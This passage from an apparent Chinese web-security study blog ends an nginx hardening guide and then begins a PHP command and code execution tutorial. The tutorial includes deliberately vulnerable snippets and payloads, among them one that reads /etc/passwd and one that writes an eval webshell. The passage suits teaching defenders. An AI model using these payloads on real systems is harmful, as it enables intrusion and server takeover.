2k;</span><br><span class="line">    <span class="comment"># å®¢æˆ·ç«¯è¯·æ±‚çš„ä¸€äº›æ¯”è¾ƒå¤§çš„å¤´æ–‡ä»¶åˆ°ç¼“å†²åŒºçš„æœ€å¤§å€¼</span></span><br><span class="line">    large_client_header_buffers 4 4k;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># ADD: é˜²æ­¢æ¶æ„æµé‡çš„çŸ­æ—¶é—´å¤§é‡è¯·æ±‚</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># ç”¨æˆ·çš„IPåœ°å€$binary_remote_addrä½œä¸ºKeyï¼Œæ¯ä¸ªIPåœ°å€æ¯ç§’å¤„ç†10ä¸ªè¯·æ±‚</span></span><br><span class="line">    limit_req_zone <span class="variable">$binary_remote_addr</span> zone=ConnLimitZone:10m rate=10r/s;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># server_names_hash_bucket_size 64;</span></span><br><span class="line">	<span class="comment"># server_name_in_redirect off;</span></span><br><span class="line"></span><br><span class="line">	include /etc/nginx/mime.types;</span><br><span class="line">	default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># SSL Settings</span></span><br><span class="line">	<span class="comment"># ADD: è¦è®©httpså’Œhttpå¹¶å­˜ï¼Œä¸èƒ½åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨ssl on</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE</span></span><br><span class="line">	<span class="comment"># ssl_prefer_server_ciphers on;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Logging Settings</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	access_log /var/<span class="built_in">log</span>/nginx/access.log;</span><br><span class="line">	error_log /var/<span class="built_in">log</span>/nginx/error.log;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Gzip Settings</span></span><br><span class="line">	<span class="comment"># ADD: å¼€å¯gzipæé«˜é¡µé¢åŠ è½½é€Ÿåº¦</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	gzip on;</span><br><span class="line"></span><br><span class="line">	gzip_vary on;</span><br><span class="line">	gzip_proxied any;</span><br><span class="line">	gzip_comp_level 6;</span><br><span class="line">	gzip_buffers 16 8k;</span><br><span class="line">	gzip_http_version 1.1;</span><br><span class="line">	gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span><br><span class="line"></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line">	<span class="comment"># Virtual Host Configs</span></span><br><span class="line">	<span class="comment">##</span></span><br><span class="line"></span><br><span class="line">	include /etc/nginx/conf.d/*.conf;</span><br><span class="line">	include /etc/nginx/sites-enabled/*;</span><br><span class="line">	</span><br><span class="line">	server &#123;</span><br><span class="line">		server_name localhost;</span><br><span class="line">		listen 80;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">##</span></span><br><span class="line">		<span class="comment"># ADD: æ¸…é™¤ä¸å®‰å…¨çš„HTTPå“åº”å¤´</span></span><br><span class="line">		<span class="comment">##</span></span><br><span class="line">        more_clear_headers <span class="string">&quot;X-Powered-By&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Server&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;ETag&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Connection&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Date&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Accept-Ranges&quot;</span>;</span><br><span class="line">        more_clear_headers <span class="string">&quot;Last-Modified&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: é¿å…ç‚¹å‡»åŠ«æŒ</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        add_header X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span>; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: é˜²XSSæ”»å‡»</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        add_header X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: ç¦ç”¨ä¸å®‰å…¨çš„HTTPæ–¹æ³•</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$request_method</span> !~ ^(GET|HEAD|POST)$ ) &#123;</span><br><span class="line">            <span class="built_in">return</span> 405;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        <span class="comment"># ADD: é™æ€èµ„æº</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        location ~* \.(js|css|flash|media|jpg|png|gif|dll|cab|CAB|ico|vbs|json|ttf|woff|eot|map)$ &#123;</span><br><span class="line">            <span class="comment"># ç¼“å­˜30å¤©</span></span><br><span class="line">            add_header Cache-Control <span class="string">&quot;max-age=2592000&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">## </span></span><br><span class="line">        <span class="comment"># ADD: é™æ€é¡µé¢</span></span><br><span class="line">        <span class="comment">##</span></span><br><span class="line">        location ~* \.html$ &#123;</span><br><span class="line">            <span class="comment"># ä¸ç¼“å­˜</span></span><br><span class="line">            add_header Cache-Control <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#mail &#123;</span></span><br><span class="line"><span class="comment">#	# See sample authentication script at:</span></span><br><span class="line"><span class="comment">#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#	# auth_http localhost/auth.php;</span></span><br><span class="line"><span class="comment">#	# pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;</span></span><br><span class="line"><span class="comment">#	# imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#	server &#123;</span></span><br><span class="line"><span class="comment">#		listen     localhost:110;</span></span><br><span class="line"><span class="comment">#		protocol   pop3;</span></span><br><span class="line"><span class="comment">#		proxy      on;</span></span><br><span class="line"><span class="comment">#	&#125;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#	server &#123;</span></span><br><span class="line"><span class="comment">#		listen     localhost:143;</span></span><br><span class="line"><span class="comment">#		protocol   imap;</span></span><br><span class="line"><span class="comment">#		proxy      on;</span></span><br><span class="line"><span class="comment">#	&#125;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>Summary</strong>ï¼š</p>
<p>åœ¨å†™è¿™ç¯‡å­¦ä¹ æ–‡æ¡£ä¹‹å‰ï¼Œæˆ‘å¯¹NginxæœåŠ¡å™¨å®‰å…¨åŠ å›ºè¿˜æ˜¯å¤„äºå®Œå…¨æ— çŸ¥çš„çŠ¶æ€ï¼Œçœ‹åˆ°å‚è€ƒèµ„æ–™çš„ä¸€äº›é…ç½®éƒ½æœ‰äº›äº‘é‡Œé›¾é‡Œï¼Œä½†æ˜¯æˆ‘åˆæ¯”è¾ƒå–œæ¬¢â€œæŠ˜è…¾â€ï¼Œæ¯ä¸ªé˜¶æ®µæˆåŠŸåéƒ½ä¼šå¯¹è™šæ‹Ÿæœºè¿›è¡Œå¿«ç…§ï¼Œé˜²æ­¢ç¯å¢ƒæ— æ³•æ¢å¤ã€‚ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡ä¿®æ”¹Nginxçš„é»˜è®¤é…ç½®ï¼Œå¯ä»¥å¯¹NginxæœåŠ¡å™¨çš„â€œå…ˆå¤©æ€§â€ç¼ºé™·è¿›è¡Œä¸»åŠ¨é˜²å¾¡ï¼Œæ¯”å¦‚ï¼šå…³é—­ç‰ˆæœ¬ä¿¡æ¯ã€å…³é—­æ…¢è¿æ¥ã€è®¾ç½®é™æ€èµ„æºå’Œé™æ€é¡µé¢çš„ç¼“å­˜æ—¶é—´ç­‰ç­‰ï¼Œè¿™æ ·å°±å¯ä»¥æ•´ä½“ä¸Šé˜²æ­¢æœåŠ¡å™¨å—åˆ°å¸¸è§çš„æ”»å‡»ã€‚</p>
<p>å¦å¤–ï¼Œè¿˜å¯ä»¥æ·»åŠ IPç™½åå•å’ŒIPé»‘åå•ï¼Œä»¥åŠè®¾ç½®Naxsiè‡ªå®šä¹‰è§„åˆ™ã€‚</p>
<h2 id="Q-A">Q&amp;A</h2>
<ol>
<li>
<p>Nginxä¸­<code>sites-available</code>å’Œ<code>sites-enabled</code>çš„åŒºåˆ«</p>
<p>sites-availableæ˜¯å­˜æ”¾å½“å‰çš„serveré…ç½®, åœ¨è¿™é‡Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼›</p>
<p>sites-enabledæ˜¯æ¿€æ´»å¹¶ä½¿ç”¨çš„serveré…ç½®ï¼ˆä»sites_availableçš„æ–‡ä»¶åˆ›å»ºå¿«æ·æ–¹å¼åˆ°sites-enabledï¼‰</p>
</li>
<li>
<p><code>ln -s</code>å‘½ä»¤</p>
<p><a href="https://www.jianshu.com/p/f7746b7fdf8d">å…·ä½“ä½¿ç”¨æ–¹æ³•</a></p>
</li>
<li>
<p>NginxæœåŠ¡å™¨å®‰å…¨åŠ å›ºå‚è€ƒæ–‡æ¡£</p>
<ul>
<li><a href="https://www.cnblogs.com/RiwellAckerman/p/11273705.html">https://www.cnblogs.com/RiwellAckerman/p/11273705.html</a></li>
<li><a href="https://my.oschina.net/jiaoyanli/blog/1510174">https://my.oschina.net/jiaoyanli/blog/1510174</a></li>
<li><a href="https://blog.csdn.net/JY_He/article/details/52299884">https://blog.csdn.net/JY_He/article/details/52299884</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-36091-1-1.html">https://bbs.ichunqiu.com/thread-36091-1-1.html</a></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>MySQL</tag>
        <tag>LEMP</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨</title>
    <url>/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨">Webå®‰å…¨åŸºç¡€å­¦ä¹ ä¹‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨</h1>
<h2 id="å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åŸç†">å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åŸç†</h2>
<p>åº”ç”¨ç¨‹åºæœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œæ¯”å¦‚åœ¨PHPä¸­ï¼Œä½¿ç”¨systemã€execã€shell_execã€passthruã€popenã€proc_openç­‰å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼šåå°ä»£ç è¿™ä¹ˆå†™<code>&lt;?php system($_GET['cmd']); ?&gt;</code>ï¼Œè¿™é‡Œçš„cmdå‚æ•°ç”¨æˆ·æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å‘é€è¯·æ±‚<code>http://example.com/?cmd=ls</code>æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<blockquote>
<p>å¾ˆå¤šäººå–œæ¬¢æŠŠä»£ç æ‰§è¡Œæ¼æ´ç§°ä¸ºå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œå› ä¸ºå‘½ä»¤æ‰§è¡Œæ¼æ´å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä»£ç æ‰§è¡Œæ¼æ´ä¹Ÿä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™æ ·å°±æ¯”è¾ƒå®¹æ˜“æ··æ·†ã€‚å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«æ˜¯ï¼šå‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯ç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œè€Œä»£ç æ‰§è¡Œæ¼æ´åˆ™æ˜¯é æ‰§è¡Œä»£ç è„šæœ¬è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œæ¯”å¦‚ï¼š<code>eval(system('set'))</code></p>
</blockquote>
<h2 id="å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨">å‘½ä»¤æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨</h2>
<p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<ol>
<li>ä»£ç ä¸­å­˜åœ¨è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚execã€systemç­‰ï¼›</li>
<li>å‡½æ•°ä¸­å­˜åœ¨æˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼›</li>
<li>å¯æ§å‚æ•°æ²¡æœ‰è¿‡æ»¤æˆ–è€…è¿‡æ»¤ä¸ä¸¥æ ¼ã€‚</li>
</ol>
<p>æ¯”å¦‚ä¸‹é¢çš„PHPä»£ç æ®µï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uri = $request[<span class="string">&#x27;uri&#x27;</span>];</span><br><span class="line">$from = $request[<span class="string">&#x27;from&#x27;</span>];</span><br><span class="line">$to = $request[<span class="string">&#x27;to&#x27;</span>];</span><br><span class="line">$tmp = <span class="string">&#x27;/tmp/act_css_tmp_&#x27;</span>. $uri;</span><br><span class="line">system(<span class="string">&#x27;/usr/bin/wget $from -O $tmp&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><code>$request</code>å˜é‡æ¥è‡ªç”¨æˆ·URLçš„è¾“å…¥ï¼Œæœ€ç»ˆè¿›å…¥åˆ°systemå‡½æ•°é‡Œä½œä¸ºå‘½ä»¤æ¥æ‰§è¡Œï¼Œä½†æ˜¯è¿™æ®µä»£ç æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·çš„è¾“å…¥ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„è¾“å…¥æ¥åˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;1190&amp;func&#x3D;sync_css&amp;uri&#x3D;hi&amp;from&#x3D;;cat &#x2F;etc&#x2F;passwd;&amp;to&#x3D;hi&amp;1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>å‘½ä»¤æ‰§è¡Œæ¼æ´å¯ä»¥æœ‰å¦‚ä¸‹çš„åˆ©ç”¨ï¼š</p>
<ol>
<li>å­˜åœ¨å›æ˜¾çš„è¯ï¼Œå¯ä»¥ç›´æ¥è¯»å…¥å„ç§é…ç½®æ–‡ä»¶ï¼Œå¯†ç æ–‡ä»¶ï¼Œæ•°æ®åº“è¿æ¥æ–‡ä»¶ç­‰ç­‰ï¼›</li>
<li>ä¸å­˜åœ¨å›æ˜¾çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨æ—¶é—´å»¶è¿Ÿæ¨æ–­ï¼Œç±»ä¼¼ç›²æ³¨çš„æ–¹æ³•ã€‚é€šè¿‡ä¸€äº›å‘½ä»¤çš„å»¶æ—¶ä½œç”¨æ¥åˆ¤æ–­æ¼æ´çš„å­˜åœ¨ï¼Œä¾‹å¦‚pingå‘½ä»¤ï¼›</li>
<li>ä¸èƒ½åœ¨æµè§ˆå™¨ç›´æ¥çœ‹åˆ°å›æ˜¾ï¼Œå¯å°†å‘½ä»¤é‡å®šå‘åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¸­å¹¶æŸ¥çœ‹ã€‚æˆ–è€…ç”¨TFTPä¸Šä¼ å·¥å…·åˆ°æœåŠ¡å™¨ï¼Œç”¨telnetå’Œnetcatå»ºç«‹åå‘shellï¼Œç”¨mailé€šè¿‡SMTPå‘é€ç»“æœï¼›</li>
<li>æŸ¥çœ‹è‡ªå·±çš„æƒé™ï¼Œå¯ä»¥æå‡æƒé™ï¼Œè®¿é—®æ•æ„Ÿæ•°æ®æˆ–æ§åˆ¶æœåŠ¡å™¨ã€‚</li>
</ol>
<h3 id="å‘½ä»¤æ‰§è¡Œæ¼æ´å¯åˆ©ç”¨çš„å‡½æ•°">å‘½ä»¤æ‰§è¡Œæ¼æ´å¯åˆ©ç”¨çš„å‡½æ•°</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">åå¼•å·</span><br></pre></td></tr></table></figure>
<h4 id="åå¼•å·">åå¼•å·</h4>
<p>åå¼•ç”¨çš„æœ¬è´¨å°±æ˜¯åœ¨æ“ä½œç³»ç»Ÿæ‰§è¡Œè¯¥å‘½ä»¤ï¼Œæ­¤æ—¶å¯ä»¥é€ æˆå‘½ä»¤æ³¨å…¥ç­‰å„ç§å±å®³ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># echo ls</span></span><br><span class="line">ls</span><br><span class="line">[root@ca0y1h-centos ~]<span class="comment"># `echo ls`</span></span><br><span class="line">vulhub-master</span><br><span class="line">[root@ca0y1h-centos ~]<span class="comment"># ls</span></span><br><span class="line">vulhub-master</span><br></pre></td></tr></table></figure>
<h4 id="exec-shell-exec-passthru">exec()/shell_exec()/passthru()</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</span><br><span class="line"></span><br><span class="line">string shell_exec ( string $cmd )</span><br><span class="line"></span><br><span class="line">string escapeshellcmd ( string $command )</span><br><span class="line"></span><br><span class="line">void passthru ( string $command [, int &amp;$return_var ] )</span><br></pre></td></tr></table></figure>
<p>è¿™å‡ ä¸ªå°±ä¸ç»†è¯´çš„ï¼Œè¯»åå­—éƒ½çŸ¥é“æ˜¯æ‰§è¡Œshellå‘½ä»¤,å¦‚æœå‡½æ•°æ‰§è¡Œæœªè¿‡æ»¤å®Œå–„çš„å¯æ§å‚æ•°ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<h4 id="popen-proc-open-pcntl-exec">popen()/proc_open()/pcntl_exec()</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br><span class="line"></span><br><span class="line">resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )</span><br><span class="line"></span><br><span class="line">void pcntl_exec ( string $path [, array $args [, array $envs ]] )</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­popen()å’Œproc_open()æ˜¯ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœçš„ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤æ˜¯å·²ç»æ‰§è¡Œäº†</p>
<h3 id="ä»£ç æ‰§è¡Œæ¼æ´å¯åˆ©ç”¨çš„å‡½æ•°">ä»£ç æ‰§è¡Œæ¼æ´å¯åˆ©ç”¨çš„å‡½æ•°</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval()</span><br><span class="line"></span><br><span class="line">assert()</span><br><span class="line"></span><br><span class="line">preg_replace()</span><br><span class="line"></span><br><span class="line">create_function()</span><br><span class="line"></span><br><span class="line">call_user_func()</span><br><span class="line"></span><br><span class="line">ob_start()</span><br></pre></td></tr></table></figure>
<h4 id="eval-å‡½æ•°">eval()å‡½æ•°</h4>
<p>eval() å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ã€‚<br>
è¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ PHP ä»£ç ï¼Œä¸”å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚<br>
å¦‚æœæ²¡æœ‰åœ¨ä»£ç å­—ç¬¦ä¸²ä¸­è°ƒç”¨ return è¯­å¥ï¼Œåˆ™è¿”å› NULLã€‚å¦‚æœä»£ç ä¸­å­˜åœ¨è§£æé”™è¯¯ï¼Œåˆ™ eval() å‡½æ•°è¿”å› falseã€‚</p>
<p>æ¯”å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str = @(<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$str=&#x27;</span><span class="string">&quot;.addslashes(<span class="subst">$str</span>).&quot;</span><span class="string">&#x27;;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?str&#x3D;$&#123;$&#123;phpinfo();&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆæ ¹æ®ä¸Šé¢ç»•è¿‡è¿‡æ»¤çš„æ–¹å¼æˆ‘ä»¬å°±å¯ä»¥è¿™æ ·å†™å…¥ä¸€å¥è¯ä»£ç äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?str&#x3D;$&#123;$&#123;fputs(fopen(&#39;test.php&#39;,&#39;w+&#39;),&#39;&lt;?php @eval(\$_POST[&#39;test&#39;])?&gt;&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="assert-å‡½æ•°">assert()å‡½æ•°</h4>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">	assert($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo();</span><br><span class="line">æˆ–</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>eval()å’Œassert()åŒºåˆ«<br>
eval()å‡½æ•°æ­£ç¡®æ‰§è¡Œéœ€è¦æ»¡è¶³phpçš„ä»£ç è§„èŒƒï¼Œè€Œassert()å‡½æ•°åˆ™ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå¯¹äºphpçš„ä»£ç è§„èŒƒè¦æ±‚ä¸é«˜</p>
</blockquote>
<h4 id="preg-replace-å‡½æ•°">preg_replace()å‡½æ•°</h4>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    preg_replace(<span class="string">&quot;//e&quot;</span>, $GET[<span class="string">&#x27;test&#x27;</span>], <span class="string">&quot;test...&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å½“replacement å‚æ•°æ„æˆä¸€ä¸ªåˆç†çš„php ä»£ç å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ/e ä¿®æ­£ç¬¦ä½¿preg_replace()ï¼Œå°†replacement å‚æ•°å½“åšphp ä»£ç æ‰§è¡Œã€‚</p>
<blockquote>
<p>æ¡ˆä¾‹ï¼š<a href="http://www.exploit-db.com/exploits/35183/">X7 Chat 2.0.5 preg_replace() PHP Code Execution</a></p>
</blockquote>
<h4 id="create-function-å‡½æ•°">create_function()å‡½æ•°</h4>
<p>åœ¨php ä¸­ä½¿ç”¨create_function()åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambda-styleï¼‰,å¦‚æœå¯¹å‚æ•°æœªè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å®¡æŸ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ç‰¹æ®Šå­—ç¬¦ä¸²ç»™create_function()ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sort_by = $_GET[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">$sorter = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">$databases=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">$sort_function = <span class="string">&#x27; return 1 * &#x27;</span> . $sorter . <span class="string">&#x27;($a[&quot;&#x27;</span> . $sort_by . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . $sort_by . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">usort($databases, create_function(â€˜$a, $bâ€™, $sort_function));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ„é€ å‡ºå‡½æ•°åŸå‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">$a,$b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>($a[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>], $b[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> . &#x27;&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®è¿™ä¸ªï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?sort_by&#x3D;â€]);&#125;phpinfo();&#x2F;*</span><br></pre></td></tr></table></figure>
<p>ä¼ å…¥åå¾—åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;phpinfo();&#x2F;*â€], $b[&quot;&quot;]);&#125;phpinfo();&#x2F;*â€]);</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜¾ç„¶ï¼Œç»è¿‡<code>/*</code>æ³¨é‡Šç¬¦</p>
<p>æˆ‘ä»¬å‰©ä¸‹çš„åªæœ‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function test($a,$b)&#123;</span><br><span class="line">return 1 * strnatcasecmp($a[&quot;&quot;]);&#125;</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ¡ˆä¾‹ï¼š<a href="https://blog.knownsec.com/2016/10/wordpress-4-6-1-language-exploit/">WordPress &lt;= 4.6.1 ä½¿ç”¨è¯­è¨€æ–‡ä»¶ä»»æ„ä»£ç æ‰§è¡Œ</a></p>
</blockquote>
<h4 id="call-user-func-å‡½æ•°">call_user_func()å‡½æ•°</h4>
<p><code>call_user_func(callable parameter [, mixed $â€¦ ]])</code>æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ã€‚</p>
<p>ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	call_user_func($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
